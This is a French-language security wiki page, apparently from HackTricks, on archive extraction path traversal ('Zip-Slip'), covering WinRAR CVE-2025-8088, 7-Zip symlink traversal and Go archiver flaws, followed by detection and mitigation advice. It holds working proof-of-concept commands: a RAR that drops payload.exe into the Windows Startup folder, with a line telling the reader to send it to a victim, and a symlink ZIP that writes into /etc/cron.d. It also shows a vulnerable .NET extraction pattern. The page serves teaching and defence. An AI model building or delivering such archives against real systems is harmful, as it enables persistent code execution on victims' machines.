# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Aperçu

De nombreux formats d'archive (ZIP, RAR, TAR, 7-ZIP, etc.) permettent à chaque entrée d'avoir son propre **chemin interne**. Lorsqu'un utilitaire d'extraction respecte aveuglément ce chemin, un nom de fichier spécialement conçu contenant `..` ou un **chemin absolu** (par ex. `C:\Windows\System32\`) sera écrit en dehors du répertoire choisi par l'utilisateur.
Cette classe de vulnérabilité est largement connue sous le nom de *Zip-Slip* ou **archive extraction path traversal**.

Les conséquences vont de l'écrasement de fichiers arbitraires jusqu'à l'obtention directe d'une **remote code execution (RCE)** en déposant une charge utile dans un emplacement **auto-run** tel que le dossier *Startup* de Windows.

## Cause racine

1. L'attaquant crée une archive où un ou plusieurs en-têtes de fichiers contiennent :
* Séquences de parcours relatives (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Chemins absolus (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Ou liens symboliques spécialement conçus qui résolvent en dehors du répertoire cible (courant dans ZIP/TAR sur *nix*).
2. La victime extrait l'archive avec un outil vulnérable qui fait confiance au chemin embarqué (ou suit les liens symboliques) au lieu de le nettoyer ou d'imposer l'extraction sous le répertoire choisi.
3. Le fichier est écrit à l'emplacement contrôlé par l'attaquant et est exécuté/chargé la prochaine fois que le système ou l'utilisateur déclenche ce chemin.

### .NET `Path.Combine` + `ZipArchive` traversal

A common .NET anti-pattern is combining the intended destination with **user-controlled** `ZipArchiveEntry.FullName` and extracting without path normalisation:
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Si `entry.FullName` commence par `..\\`, il traverse l'arborescence ; si c'est un **chemin absolu** la composante de gauche est entièrement ignorée, ce qui aboutit à un **arbitrary file write** en tant qu'identité d'extraction.
- Archive de preuve de concept pour écrire dans le répertoire frère `app` surveillé par un scanner programmé:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Déposer ce ZIP dans la boîte de réception surveillée entraîne `C:\samples\app\0xdf.txt`, prouvant traversal en dehors de `C:\samples\queue\` et permettant follow-on primitives (p. ex., DLL hijacks).

## Exemple réel – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR pour Windows (y compris le `rar` / `unrar` CLI, la DLL et le code source portable) n'a pas validé les noms de fichiers lors de l'extraction.
Une archive RAR malveillante contenant une entrée telle que :
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
se retrouverait **en dehors** du répertoire de sortie sélectionné et dans le dossier *Startup* de l'utilisateur. Après la connexion, Windows exécute automatiquement tout ce qui s'y trouve, fournissant une RCE *persistante*.

### Création d'une archive PoC (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Options used:
* `-ep`  – stocker les chemins de fichiers exactement tels quels (ne pas supprimer le préfixe `./`).

Distribuez `evil.rar` à la victime et demandez-lui de l'extraire avec une version vulnérable de WinRAR.

### Exploitation observée sur le terrain

ESET a rapporté des campagnes de spear-phishing RomCom (Storm-0978/UNC2596) qui joignaient des archives RAR exploitant CVE-2025-8088 pour déployer des backdoors personnalisés et faciliter des opérations de ransomware.

## Cas récents (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug** : les entrées ZIP qui sont des **symbolic links** étaient déréférencées pendant l'extraction, permettant aux attaquants de sortir du répertoire de destination et d'écraser des chemins arbitraires. L'interaction utilisateur se limite à *ouvrir/extraire* l'archive.
* **Affectés** : 7-Zip 21.02–24.09 (builds Windows & Linux). Corrigé dans **25.00** (juillet 2025) et versions ultérieures.
* **Impact** : Écraser `Start Menu/Programs/Startup` ou des emplacements exécutés par des services → le code s'exécute au prochain logon ou redémarrage du service.
* **PoC rapide (Linux)** :
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Sur une build patchée `/etc/cron.d` ne sera pas modifié ; le symlink est extrait en tant que lien à l'intérieur de /tmp/target.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug** : `archiver.Unarchive()` suit `../` et les entrées ZIP symlinkées, écrivant en dehors de `outputDir`.
* **Affectés** : `github.com/mholt/archiver` ≤ 3.5.1 (projet maintenant déprécié).
* **Correction** : Passer à `mholt/archives` ≥ 0.1.0 ou implémenter des vérifications de chemin canonique avant l'écriture.
* **Reproduction minimale** :
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Conseils de détection

* **Static inspection** – Lister les entrées de l'archive et signaler tout nom contenant `../`, `..\\`, *chemins absolus* (`/`, `C:`) ou des entrées de type *symlink* dont la cible est en dehors du répertoire d'extraction.
* **Canonicalisation** – S'assurer que `realpath(join(dest, name))` commence toujours par `dest`. Rejeter sinon.
* **Sandbox extraction** – Décompresser dans un répertoire jetable en utilisant un extracteur *safe* (e.g., `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) et vérifier que les chemins résultants restent à l'intérieur du répertoire.
* **Endpoint monitoring** – Alerter sur de nouveaux exécutables écrits dans les emplacements `Startup`/`Run`/`cron` peu après qu'une archive ait été ouverte par WinRAR/7-Zip/etc.

## Atténuation & durcissement

1. **Mettre à jour l'extracteur** – WinRAR 7.13+ et 7-Zip 25.00+ implémentent la sanitisation des chemins/symlinks. Les deux outils n'ont toujours pas de mise à jour automatique.
2. Extraire les archives avec “**Do not extract paths**” / “**Ignore paths**” lorsque possible.
3. Sur Unix, abandonner les privilèges & monter un **chroot/namespace** avant l'extraction ; sur Windows, utiliser **AppContainer** ou une sandbox.
4. Si vous écrivez du code personnalisé, normalisez avec `realpath()`/`PathCanonicalize()` **avant** la création/écriture, et rejetez toute entrée qui s'échappe du répertoire de destination.

## Autres cas affectés / historiques

* 2018 – Alerte massive *Zip-Slip* par Snyk affectant de nombreuses bibliothèques Java/Go/JS.
* 2023 – 7-Zip CVE-2023-4011, traversée similaire lors de la fusion `-ao`.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) traversée lors de l'extraction TAR dans les slugs (patch en v1.2).
* Toute logique d'extraction personnalisée qui n'appelle pas `PathCanonicalize` / `realpath` avant d'écrire.

## Références

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

{{#include ../banners/hacktricks-training.md}}
